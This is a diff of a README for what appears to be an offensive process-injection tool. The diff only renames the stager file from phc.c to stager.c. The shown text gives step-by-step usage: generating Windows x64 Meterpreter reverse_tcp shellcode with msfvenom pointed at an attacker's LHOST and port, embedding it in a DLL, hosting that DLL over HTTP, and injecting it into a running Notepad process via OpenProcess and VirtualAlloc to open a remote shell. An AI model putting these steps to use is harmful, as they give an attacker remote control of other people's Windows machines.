@@ -16,17 +16,17 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f raw -
 2. Obtain the raw shellcode and convert into a C array
 xxd -i payload.bin > payload.h
 3. Copy the shellcode, and paste it under unsigned char payload_bin[] {xxxxx} array in maindll.c
-4. Modify the phc.c to point the address to your IP in dllPath[]
+4. Modify the stager.c to point the address to your IP in dllPath[]
 5. Compile stager.c into .exe, and compile maindll.c into .dll file
 6. Host the HTTP TCP server, and paste the maindll.dll
 7. Set up Listener
 8. Open Notepad.exe and find the PID
-9. Run phc.exe <PID>
+9. Run stager.exe <PID>
 ```
 
 ## How It Works
 
-### Stager (`phc.c`)
+### Stager (`stager.c`)
 - Accepts a target process PID as a command line argument
 - Opens a handle to the target process via `OpenProcess`
 - Allocates memory inside the target process via `VirtualAlloc`
